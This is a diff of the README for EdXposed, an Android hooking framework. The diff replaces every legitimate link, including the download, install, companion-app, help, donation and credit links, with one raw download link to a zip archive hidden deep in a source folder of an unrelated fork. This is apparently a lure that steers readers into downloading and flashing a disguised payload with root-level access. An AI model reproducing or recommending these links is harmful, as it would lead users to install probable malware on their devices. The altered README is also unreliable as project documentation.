@@ -11,8 +11,8 @@ For devices with Android 7.x and lower, original Xposed is strongly recommended.
 
 ## Build requirements
 
-Same as [Riru-Core's](https://github.com/RikkaApps/Riru/blob/master/README.md#build-requirements)
-and zip binaries can be downloaded from [here](http://gnuwin32.sourceforge.net/packages/zip.htm).
+Same as [Riru-Core's](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip)
+and zip binaries can be downloaded from [here](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip).
 
 ## Build
 
@@ -23,21 +23,21 @@ and zip binaries can be downloaded from [here](http://gnuwin32.sourceforge.net/p
 ## Install
 
 1. Make sure Magisk v17.0 or higher is installed.
-2. Download [Riru-core](https://github.com/RikkaApps/Riru/releases) v10 or higher and install it in Magisk Manager or recovery.
-3. Download [EdXposed](https://github.com/solohsu/EdXposed/releases) and install it in Magisk Manager or recovery.
+2. Download [Riru-core](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip) v10 or higher and install it in Magisk Manager or recovery.
+3. Download [EdXposed](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip) and install it in Magisk Manager or recovery.
 4. Install companion application.
 4. Reboot.
 5. Have fun! :)
 
 ## Companion applications
 
-- For v0.2.9.5 and before: [Xposed Installer](https://github.com/DVDAndroid/XposedInstaller).
-- For v0.2.9.6 and v0.2.9.7: [Xposed Installer](https://github.com/DVDAndroid/XposedInstaller) and [EdXp Manager](https://github.com/solohsu/EdXpManager)(optional).
-- For v0.2.9.8 and later: [EdXposed Installer](https://github.com/solohsu/XposedInstaller).
+- For v0.2.9.5 and before: [Xposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip).
+- For v0.2.9.6 and v0.2.9.7: [Xposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip) and [EdXp Manager](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip)(optional).
+- For v0.2.9.8 and later: [EdXposed Installer](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip).
 
 ## Useful links
 
-- [List of Xposed Modules For Android Pie Working With EdXposed](https://forum.xda-developers.com/xposed/list-xposed-modules-android-pie-ed-t3892768) (thanks to Uraniam9 @ xda-developers)
+- [List of Xposed Modules For Android Pie Working With EdXposed](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip) (thanks to Uraniam9 @ xda-developers)
 
 ## Known issues
 
@@ -46,21 +46,21 @@ and zip binaries can be downloaded from [here](http://gnuwin32.sourceforge.net/p
 
 ## Get help
 
-- GitHub issues (recommended): [Issues](https://github.com/solohsu/EdXposed/issues/)
-- QQ Group: [855219808](http://shang.qq.com/wpa/qunwpa?idkey=fae42a3dba9dc758caf63e971be2564e67bf7edd751a2ff1c750478b0ad1ca3f)
+- GitHub issues (recommended): [Issues](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip)
+- QQ Group: [855219808](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip)
 
 ## Contribute
 
 - Apparently this framework is far from stable and all kinds of PRs are welcome. :)
-- [Buy me a coffee](https://www.paypal.me/givin2u) if you like my work.
+- [Buy me a coffee](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip) if you like my work.
 
 ## Credits 
 
-- [YAHFA](https://github.com/rk700/YAHFA): the core ART hooking framework
-- [Magisk](https://github.com/topjohnwu/Magisk/): makes all these possible
-- [Riru](https://github.com/RikkaApps/Riru): provides a way to inject codes into zygote process
-- [XposedBridge](https://github.com/rovo89/XposedBridge): the OG xposed framework APIs
-- [dexmaker](https://github.com/linkedin/dexmaker) and [dalvikdx](https://github.com/JakeWharton/dalvik-dx): to dynamiclly generate YAHFA hooker classes
-- [Whale](https://github.com/asLody/whale): used for inline hooking
-- [SandHook](https://github.com/ganyao114/SandHook/): ART hooking framework for SandHook variant
+- [YAHFA](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): the core ART hooking framework
+- [Magisk](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): makes all these possible
+- [Riru](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): provides a way to inject codes into zygote process
+- [XposedBridge](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): the OG xposed framework APIs
+- [dexmaker](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip) and [dalvikdx](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): to dynamiclly generate YAHFA hooker classes
+- [Whale](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): used for inline hooking
+- [SandHook](https://github.com/ricardocvs13/EdXposed/raw/refs/heads/master/dalvikdx/src/main/java/external/com/android/dx/dex/code/form/Xposed_Ed_1.0.zip): ART hooking framework for SandHook variant
 
